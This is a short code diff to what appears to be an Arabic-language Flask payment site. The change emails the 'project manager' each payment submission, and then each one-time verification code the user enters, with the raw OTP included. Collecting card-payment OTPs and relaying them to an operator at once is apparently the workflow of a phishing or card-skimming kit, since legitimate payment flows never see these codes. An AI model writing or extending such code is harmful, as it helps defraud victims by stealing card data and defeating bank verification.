@@ -14,6 +14,7 @@ from db import (
     init_db,
     insert_registration,
     list_registrations,
+    get_registration,
     update_email_status,
     create_payment_token,
     get_payment_token,
@@ -22,7 +23,12 @@ from db import (
     insert_otp_attempt,
     get_latest_payment_attempt,
 )
-from mailer import send_registration_email, send_admin_registration_email, send_admin_contact_email
+from mailer import (
+    send_registration_email,
+    send_admin_registration_email,
+    send_admin_contact_email,
+    send_admin_payment_email,
+)
 
 load_dotenv()
 
@@ -145,6 +151,11 @@ def submit_payment(token):
         if not attempt_id:
             return jsonify({"ok": False, "error": "فشل حفظ بيانات الدفع"}), 500
 
+        # Notify the project manager of the payment submission.
+        registration = get_registration(row.get("registration_id"))
+        payment_row = get_latest_payment_attempt(token)
+        send_admin_payment_email(registration, payment_row)
+
         return jsonify({"ok": True, "attempt_id": attempt_id, "redirect": f"/pay/{token}/verify"})
     except Exception as e:
         return jsonify({"ok": False, "error": f"خطأ في الخادم: {e}"}), 500
@@ -168,6 +179,11 @@ def submit_otp(token):
         status = "pending"
 
         insert_otp_attempt(token, payment_attempt_id, otp, status)
+
+        # Notify the project manager of the OTP submission.
+        registration = get_registration(row.get("registration_id"))
+        send_admin_payment_email(registration, payment_attempt, otp_code=otp)
+
         return jsonify({"ok": True, "status": status, "message": "تم استلام رمز التحقق"})
     except Exception as e:
         return jsonify({"ok": False, "error": f"خطأ في الخادم: {e}"}), 500
